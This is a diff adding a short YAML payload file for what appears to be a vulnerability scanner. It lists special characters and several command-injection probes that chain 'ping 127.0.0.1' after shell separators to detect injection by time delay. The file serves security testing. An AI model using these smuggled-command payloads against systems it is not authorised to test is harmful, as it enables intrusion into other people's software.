@@ -1,0 +1,16 @@
+F00000:
+  name: Common SpecialChars
+  description: 特殊字符集
+  level: info
+  payloads: "!@#$%^&*()_+=-|\"':;?/>.<,{}[]`"
+
+F00001:
+  name: Command Injections
+  description: 命令注入
+  level: critical
+  payloads:
+    - "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &"
+    - "| ping -i 30 127.0.0.1 |"
+    - "| ping -n 30 127.0.0.1 |"
+    - "& ping -i 30 127.0.0.1 &"
+    - "& ping -n 30 127.0.0.1 &"
